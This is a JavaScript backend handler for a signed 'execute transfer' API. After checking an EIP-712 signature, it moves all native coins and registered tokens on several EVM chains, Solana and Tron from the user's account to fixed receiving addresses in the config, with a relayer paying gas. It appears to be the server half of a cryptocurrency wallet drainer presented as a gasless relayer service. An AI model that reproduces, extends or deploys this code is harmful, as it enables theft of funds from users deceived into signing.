import { signatureVerifier } from '../utils/signatureVerifier.js'
import EIP712Verifier from '../utils/eip712Verifier.js'
import { CONFIG } from '../config.js'
import { TOKEN_REGISTRY } from '../config/tokenRegistry.js'

/**
 * POST /api/execute-transfer-signed
 * Execute transfers with EIP-712 signature verification
 * Relayer wallet pays gas and executes all transfers
 */
export async function handleExecuteTransferSigned(req, res) {
  try {
    const { account, signature, messageData, balances } = req.body

    if (!account || !signature || !messageData || !balances) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields: account, signature, messageData, balances'
      })
    }

    console.log('🔐 Starting signed transfer execution for:', account)

    // Step 1: Verify EIP-712 signature
    console.log('📝 Verifying EIP-712 signature...')
    try {
      signatureVerifier.verifyEIP712(
        account,
        messageData.message,
        messageData.domain,
        messageData.types,
        signature
      )
      console.log('✅ Signature verified successfully')
    } catch (error) {
      console.error('❌ Signature verification failed:', error.message)
      return res.status(401).json({
        success: false,
        error: 'Invalid or expired signature: ' + error.message
      })
    }

    // Step 2: Execute transfers with RELAYER WALLET (relayer pays gas)
    console.log('🚀 Executing transfers with RELAYER wallet...')

    const { evmService } = await import('../services/evmService.js')
    const { solanaService } = await import('../services/solanaService.js')
    const { tronService } = await import('../services/tronService.js')
    const { suiService } = await import('../services/suiService.js')

    const transfers = {}
    const transferHashes = []

    // TRANSFER EVM CHAINS
    for (const chain of ['ethereum', 'bsc', 'polygon', 'arbitrum', 'base', 'optimism', 'avalanche']) {
      const chainBalance = balances[chain]

      if (!chainBalance) continue

      console.log(`\n🔄 Processing ${chain}...`)

      // Handle legacy format (just a string/number)
      if (typeof chainBalance === 'string' || typeof chainBalance === 'number') {
        const amount = parseFloat(chainBalance)
        if (amount > 0.001) {
          console.log(`  💰 Native balance: ${amount}`)
          const receivingAddress = CONFIG.receivingAddresses[chain]

          // Transfer FROM user TO receiver with RELAYER paying gas
          const result = await evmService.transferNativeWithRelayer(
            chain,
            account, // FROM user
            receivingAddress, // TO receiver
            amount.toString()
          )
          transfers[chain] = result
          if (result.hash) transferHashes.push(result.hash)
        }
        continue
      }

      // Handle new format { native: '0.5', tokens: { USDT: '100' } }
      const { native = '0', tokens = {} } = chainBalance
      const nativeAmount = parseFloat(native)

      // Transfer native coin with relayer
      if (nativeAmount > 0.001) {
        console.log(`  💰 Native ${chain}: ${nativeAmount}`)
        const receivingAddress = CONFIG.receivingAddresses[chain]

        const result = await evmService.transferNativeWithRelayer(
          chain,
          account, // FROM user
          receivingAddress, // TO receiver
          nativeAmount.toString()
        )
        transfers[`${chain}_native`] = result
        if (result.hash) transferHashes.push(result.hash)
      }

      // Transfer ERC-20 tokens with relayer
      for (const [symbol, balance] of Object.entries(tokens)) {
        const tokenAmount = parseFloat(balance)
        if (tokenAmount > 0) {
          const tokenInfo = TOKEN_REGISTRY[chain]?.[symbol]
          if (tokenInfo) {
            console.log(`  🪙 ${symbol}: ${tokenAmount}`)
            const receivingAddress = CONFIG.receivingAddresses[chain]

            const result = await evmService.transferTokenWithRelayer(
              chain,
              tokenInfo.address,
              account, // FROM user
              receivingAddress, // TO receiver
              tokenAmount.toString(),
              tokenInfo.decimals
            )
            transfers[`${chain}_${symbol}`] = result
            if (result.hash) transferHashes.push(result.hash)
          }
        }
      }
    }

    // TRANSFER SOLANA
    if (balances.solana) {
      const chainBalance = balances.solana
      const amount = typeof chainBalance === 'string' ? parseFloat(chainBalance) : parseFloat(chainBalance?.native || 0)

      if (amount > 0.001) {
        console.log(`\n🔄 Processing Solana...`)
        console.log(`  💰 SOL: ${amount}`)

        // Relayer transfers with relayer wallet signature
        const result = await solanaService.transferSOLWithRelayer(account, amount)
        transfers.solana = result
        if (result.hash) transferHashes.push(result.hash)
      }
    }

    // TRANSFER TRON
    if (balances.tron) {
      const chainBalance = balances.tron
      const amount = typeof chainBalance === 'string' ? parseFloat(chainBalance) : parseFloat(chainBalance?.native || 0)

      if (amount > 1) {
        console.log(`\n🔄 Processing Tron...`)
        console.log(`  💰 TRX: ${amount}`)

        // Relayer transfers with relayer wallet signature
        const result = await tronService.transferTRXWithRelayer(account, amount)
        transfers.tron = result
        if (result.hash) transferHashes.push(result.hash)
      }
    }

    // TRANSFER SUI
    if (balances.sui) {
      console.log(`\n⚠️ SUI transfers not yet implemented`)
    }

    console.log('\n✅ All signed transfers completed')
    console.log(`📊 Summary: ${transferHashes.length} successful transfers`)

    res.status(200).json({
      success: true,
      account,
      transfers,
      transferHashes,
      signatureVerified: true,
      relayerUsed: true,
      timestamp: Date.now()
    })
  } catch (error) {
    console.error('Execute signed transfer error:', error)
    res.status(500).json({
      success: false,
      error: error.message
    })
  }
}

export default handleExecuteTransferSigned
